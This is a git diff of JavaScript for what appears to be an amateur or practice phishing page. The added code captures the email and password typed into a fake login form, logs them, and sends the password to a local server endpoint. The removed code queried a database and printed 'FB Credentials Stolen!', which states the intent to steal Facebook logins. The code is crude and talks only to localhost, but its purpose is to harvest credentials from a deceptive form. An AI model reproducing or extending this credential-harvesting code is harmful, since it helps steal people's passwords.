@@ -1,36 +1,39 @@
-import Client from 'pg';
-// const { Client } = require("pg");
+let head = document.getElementById("header");
+console.log(head);
 
-const client = new Client({
-  host: "localhost",
-  user: "postgres",
-  port: 5432,
-  password: "???",
-  database: "test",
+let button = document.querySelector(".fake-button");
+
+let email = document.querySelector("#email");
+let password = document.querySelector("#password");
+let emailInput = "";
+let passwordInput = "";
+
+email.addEventListener("input", (e) => {
+  emailInput = e.target.value;
+  console.log(`usernameInput is ${emailInput}`);
+});
+password.addEventListener("input", (e) => {
+  passwordInput = e.target.value;
+  console.log(`passwordInput is ${passwordInput}`);
 });
 
-function saveCredentials() {
-    
-  client.connect();
+button.addEventListener("click", async () => {
 
-  client.query(
-    "SELECT * FROM test1",
-    (res, err) => {
-      if (!err) {
-        console.log('FB Credentials Stolen!');
-        console.log(res.rows);
-      } else {
-        console.log(err.message);
-      }
-      client.end();
-    }
-  );
-}
+  const body = { userName: 'poopy', password: passwordInput };
 
-let form = document.querySelector('.fake-form');
-let button = document.querySelector('.fake-button');
-let div = document.createElement('div');
-div.innerText = 'poo';
-button.addEventListener('click', () => {
-    saveCredentials();
-})
+  console.log(body);
+
+  try {
+    let response = await fetch("http://localhost:5000/getUsers", {
+        method: "PUT",
+        body: JSON.stringify(body)
+    });
+    // let resObj = await response.json();
+    // console.log(resObj);
+  } catch (error) {
+    console.log(error.message);
+  }
+
+  //   alert(`you entered ${usernameInput} for username`);
+  //   console.log(username.innerText);
+});
